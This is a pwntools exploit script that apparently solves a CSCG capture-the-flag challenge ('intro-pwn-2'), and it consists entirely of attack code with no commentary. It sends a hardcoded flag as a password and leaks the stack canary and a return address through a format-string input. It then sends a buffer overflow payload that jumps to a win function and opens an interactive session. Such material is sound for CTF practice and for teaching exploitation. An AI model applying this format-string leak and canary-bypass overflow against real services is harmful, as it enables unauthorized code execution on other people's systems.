from pwn import *

PASSWORD = "CSCG{NOW_PRACTICE_EVEN_MORE}"
WIN_ADDR = 0xb95
WELCOME_RET = 0xdc5

p = remote("7b00000021e4c5071c1ffb72-intro-pwn-2.challenge.broker.cscg.live", 31337, ssl= True)

print(p.recv())
p.sendline(PASSWORD)

print(p.recv())
p.sendline("#%39$llu|%41$llu#")

p.recvuntil("#")
canary, ret_addr = map(int, p.recvuntil("#")[:-1].split(b"|"))

log.info(f"Leaked stack canary: {canary:#x}")
log.info(f"Leaked ret address: {ret_addr:#x}")

p.recvuntil(":")

ret_addr -= WELCOME_RET

payload = b"Expelliarmus\0".ljust(0x108)
payload += p64(canary)
payload += b"A" * 8
payload += p64(ret_addr + WIN_ADDR)

p.sendline(payload)
p.interactive()
